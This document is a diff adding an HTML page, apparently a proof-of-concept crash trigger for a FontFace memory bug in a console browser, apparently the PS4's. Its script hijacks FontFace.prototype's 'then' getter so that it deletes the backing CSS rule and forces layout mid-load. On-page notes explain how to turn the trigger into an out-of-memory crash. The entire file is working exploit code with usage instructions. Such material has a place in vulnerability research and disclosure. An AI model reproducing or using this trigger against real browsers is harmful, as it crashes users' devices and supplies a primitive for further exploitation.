@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Crash test — FontFace bug</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; margin: 0; }
+#status { font-size: 16px; margin-bottom: 8px; color: #ff0; }
+#log { font-size: 12px; line-height: 1.6; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">triggering...</div>
+<div id="log"></div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    function log(msg) {
+        logEl.innerHTML += msg + '<br>';
+    }
+    window.clog = log;
+    window.cstatus = function (t, c) {
+        statusEl.textContent = t;
+        if (c) statusEl.style.color = c;
+    };
+})();
+
+// ?v=min for phase1 minimum (no y/z), default = full original
+var full = location.search.indexOf('v=min') === -1;
+
+window.onload = function () {
+    clog('crash.html — mode: ' + (full ? 'FULL (y/z + deleteRule + layout)' : 'MIN (deleteRule + layout)'));
+    clog('UA: ' + navigator.userAgent);
+    clog('');
+    clog('HOW THIS CRASHES ON PS4:');
+    clog('  1) First open — trigger may run, page may SURVIVE (memory leak)');
+    clog('  2) REFRESH once — usually OOM "not enough free memory"');
+    clog('  OR open twice without refresh if memory already leaked');
+    clog('');
+    clog('Fully QUIT browser first if testing clean.');
+    clog('---');
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+    clog('FontFace A ready');
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            clog('then getter fired, this===A: ' + (this === A));
+            if (!fired && this === A) {
+                fired = true;
+                clog('TRIGGER RUNNING');
+                if (full) {
+                    new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                    new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                    clog('  created y, z FontFaces');
+                }
+                document.getElementById('s').sheet.deleteRule(0);
+                clog('  deleteRule(0) done, cssRules=' + document.getElementById('s').sheet.cssRules.length);
+                document.body.offsetTop;
+                document.documentElement.offsetTop;
+                clog('  layout flush done');
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+    clog('document.fonts.load(AB) called');
+
+    setTimeout(function () {
+        if (fired) {
+            cstatus('TRIGGER FIRED — if no crash, REFRESH once for OOM', '#ff0');
+            clog('');
+            clog('TRIGGER OK — refresh page now for OOM crash');
+        } else {
+            cstatus('TRIGGER NEVER FIRED — bug path not taken', '#f66');
+            clog('');
+            clog('FAILED: then getter never ran. Quit browser, try again.');
+            clog('Do NOT use phase3 probe pages to test crash — use this file.');
+        }
+    }, 1500);
+};
+</script>
+</body>
+</html>
